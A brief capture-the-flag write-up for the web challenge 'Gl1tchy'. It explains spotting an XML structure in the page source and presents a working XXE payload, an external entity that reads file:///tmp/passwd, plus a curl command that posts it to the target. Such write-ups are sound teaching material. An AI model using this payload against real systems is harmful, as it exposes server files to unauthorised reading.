# Gl1tchy

> web

Author: [whitex](https://github.com/najeh-halawani)

Glitchs are very annoying, we hate them. Maybe the user stays with you 😉

## Writeup

### Recon

Apparently the website has nothing, but when reviewing the source code we see the following comment:

![Website Homepage]()
![Source Code]()


# Read Source code... check XML 

# Try to understand the structure of the xml 

```
<creds>
  <user>whitex</user>
</creds>
```

#no need for <pass> </pass>
#final payload

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///tmp/passwd" >]>
<creds>
 <user>&xxe;</user>
 <pass>mypass</pass>
</creds>
```

# trigger the payload using curl

```curl -d @xxe http://ip```
